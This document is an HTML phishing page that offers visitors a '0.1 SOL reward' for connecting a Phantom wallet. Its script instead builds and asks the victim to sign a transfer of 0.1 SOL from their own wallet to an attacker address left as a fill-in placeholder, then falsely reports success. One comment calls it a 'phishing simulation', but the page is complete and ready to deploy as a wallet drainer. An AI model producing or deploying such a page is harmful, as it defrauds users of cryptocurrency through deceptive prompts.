<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Claim Reward</title>
    <!-- Phantom Wallet SDK -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }

        .container {
            padding: 20px;
            max-width: 90%;
        }

        h1 {
            font-size: 2rem;
            margin-bottom: 10px;
            color: #fff;
        }

        p {
            color: #ccc;
            margin-bottom: 30px;
        }

        /* The Green Button */
        .btn-green {
            background-color: #00ff88;
            color: #000;
            border: none;
            padding: 15px 40px;
            font-size: 1.2rem;
            font-weight: bold;
            border-radius: 30px;
            cursor: pointer;
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.4);
            transition: transform 0.2s;
        }

        .btn-green:active {
            transform: scale(0.95);
        }

        #status {
            margin-top: 20px;
            font-size: 1rem;
            color: #00ff88;
            min-height: 24px;
        }

        /* Loading Spinner */
        .spinner {
            display: none;
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>SOL Reward</h1>
        <p>Connect your Phantom Wallet to claim 0.1 SOL.</p>
        
        <button id="connectBtn" class="btn-green" onclick="initiateClaim()">Sign Green</button>
        
        <div id="spinner" class="spinner"></div>
        <div id="status"></div>
    </div>

    <script>
        // REPLACE THIS WITH YOUR PHANTOM WALLET ADDRESS
        const RECIPIENT_ADDRESS = "YOUR_WALLET_ADDRESS"; 
        
        // Helper to convert string address to PublicKey
        function getPublicKey() {
            return new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
        }

        async function initiateClaim() {
            const statusDiv = document.getElementById("status");
            const spinner = document.getElementById("spinner");
            const btn = document.getElementById("connectBtn");

            // 1. Check if Phantom is installed
            if (!window.solana || !window.solana.isPhantom) {
                alert("Please install Phantom Wallet on your iPhone.");
                return;
            }

            try {
                // 2. Request Connection (Permissions)
                statusDiv.innerText = "Connecting...";
                const resp = await window.solana.connect();
                
                // Get the user's public key from the connection response
                const userPublicKey = resp.publicKey;

                // 3. Build Transaction
                // We are sending 0.1 SOL (100,000,000 lamports) to your address
                const transaction = new solanaWeb3.Transaction();
                
                // Add a transfer instruction: From User -> To You
                transaction.add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: userPublicKey,
                        toPubkey: getPublicKey(),
                        lamports: 100000000, // 0.1 SOL
                    })
                );

                // 4. Send Transaction to Phantom for Signature
                statusDiv.innerText = "Sign Green...";
                
                // We use sendAndConfirmTransaction but Phantom usually prefers signTransaction + sendTransaction
                // However, for simple phishing simulation, we can use the standard flow or ask for signature
                
                const { signature } = await window.solana.signAndSendTransaction(transaction);
                
                statusDiv.innerText = "Success! Check your wallet.";
                btn.style.display = 'none';

            } catch (err) {
                console.error(err);
                statusDiv.innerText = "Cancelled by user.";
            }
        }
    </script>
</body>
</html>
